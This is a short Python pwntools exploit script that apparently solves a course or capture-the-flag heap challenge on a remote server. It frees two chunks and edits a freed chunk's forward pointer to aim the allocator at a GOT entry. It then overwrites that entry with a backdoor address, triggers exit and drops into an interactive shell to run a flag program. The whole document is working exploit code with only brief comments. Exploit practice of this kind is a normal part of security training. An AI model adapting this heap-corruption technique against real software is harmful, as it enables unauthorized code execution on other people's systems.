from pwn import *
context.arch = 'amd64'
# context.log_level = 'debug'

sh = remote('47.99.80.189', 10030)

sh.recvuntil("Please input your StudentID:\n")
sh.sendline('3180105507')

# allocate 3 chunks ABC
for i in range(3):
    sh.recvuntil("Your chocie:\n")
    sh.sendline('1')
    sh.recvuntil("please input the ddl time\n")
    sh.sendline('1')
    sh.recvuntil("please input the ddl content\n")
    sh.sendline('1')

# free A chunk
sh.recvuntil("Your chocie:\n") 
sh.sendline('2') 
sh.recvuntil("please input the ddl index\n") 
sh.sendline('1')

# free B chunk
sh.recvuntil("Your chocie:\n") 
sh.sendline('2')  
sh.recvuntil("please input the ddl index\n") 
sh.sendline('2') 

# modify B chunk's fd to GOT 
sh.recvuntil("Your chocie:\n") 
sh.sendline('4') 
sh.recvuntil("please input the ddl index\n") 
sh.sendline('2')   
sh.recvuntil("please input the new ddl time\n") 
got_addr = 0x602078
sh.sendline(p64(got_addr))  
sh.recvuntil("please input the new ddl content\n")
sh.sendline('1')  

# allocate 2 chunks DE
for i in range(2):
    sh.recvuntil("Your chocie:\n")
    sh.sendline('1')
    sh.recvuntil("please input the ddl time\n")
    sh.sendline('1')
    sh.recvuntil("please input the ddl content\n")
    sh.sendline('1')

# modify E chunk's fd to backdoor address 
sh.recvuntil("Your chocie:\n") 
sh.sendline('4') 
sh.recvuntil("please input the ddl index\n") 
sh.sendline('5')   
sh.recvuntil("please input the new ddl time\n") 
backdoor_addr = 0x0000000000400917
sh.sendline(p64(backdoor_addr)) 
sh.recvuntil("please input the new ddl content\n") 
sh.sendline('1') 

# trigger exit
sh.recvuntil("Your chocie:\n") 
sh.sendline('5') 

sh.recvuntil("Hah! you got me\n") 
sh.sendline("./flag.exe 3180105507") 
sh.interactive()
